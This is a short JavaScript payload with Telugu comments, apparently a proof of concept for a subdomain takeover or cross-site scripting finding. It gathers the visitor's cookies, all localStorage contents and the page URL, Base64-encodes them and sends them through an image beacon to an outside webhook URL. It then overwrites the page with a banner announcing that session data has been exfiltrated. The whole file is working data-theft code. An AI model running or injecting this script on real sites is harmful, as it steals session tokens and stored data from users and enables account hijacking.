(function() {
    // నీ కొత్త వెబ్‌హుక్ లింక్
    var webhook = "https://25ad80f0-8ab5-44cc-90eb-744bea49970e.webhooksite.net/";

    // డేటా సేకరించడం
    var info = {
        hacker: "Ramavath Gopi Nayak",
        cookies: document.cookie || "No Cookies Found",
        storage: JSON.stringify(localStorage),
        url: window.location.href
    };

    // Base64 Encoding
    var encoded = btoa(JSON.stringify(info));

    // 1. Image Beacon (అత్యంత నమ్మకమైన పద్ధతి)
    var img = new Image();
    img.src = webhook + "?report=" + encoded;

    // 2. స్క్రీన్ మీద కనిపిస్తే PoC సక్సెస్ అయినట్టు గుర్తు
    document.body.innerHTML = `
        <div style="background:black; color:red; padding:50px; text-align:center; height:100vh;">
            <h1>Vulnerability Confirmed</h1>
            <p>Subdomain Takeover by Naik Gopi</p>
            <p>Session data has been exfiltrated to the listener.</p>
        </div>`;
})();
